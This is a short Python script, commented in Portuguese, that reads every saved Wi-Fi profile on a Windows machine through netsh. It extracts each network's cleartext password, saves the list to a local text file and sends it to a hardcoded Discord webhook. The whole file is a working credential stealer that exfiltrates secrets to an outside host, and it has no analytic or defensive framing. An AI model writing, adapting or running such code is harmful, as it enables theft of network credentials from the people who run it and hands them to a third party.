import subprocess
import datetime
from discord_webhook import DiscordWebhook

def get_networks():
    information_command = subprocess.check_output("netsh wlan show profiles", encoding="cp858", shell=True)
    networks = []
    for line in information_command.split('\n'):
        if "Todos os Perfis de Usuários" in line:
            position = line.find(":")
            network = line[position + 2:]
            password = information_network(network)
            networks.append("Nome = "+ network + " // Senha = " + password)
    return networks

def information_network(wifi):
    information_command = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key", "=", "clear"],
                                                  encoding="cp858", shell=True)
    network = ''
    for line in information_command.split('\n'):
        if "Conteúdo da Chave" in line:
            position = line.find(":")
            network = line[position + 2:]
            break
    return network

if __name__ == "__main__":
    print(get_networks())

dia = datetime.datetime.now()

with open ("Appsaves.txt", "w") as arquivos:
    arquivos.write("As senhas do dia sao: {} // {} ".format(get_networks(),dia))

with open ("Appsaves.txt", "r") as senhasgamers:
    NetInject = senhasgamers.read()

webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1150539523663605882/Z_AezEKC5gYw_TCE20canPY0qygZGIRYS4ia0EeATCZJwOoWtoARNdv-MFfUWqlVpNON", content="{}".format(NetInject))
response = webhook.execute()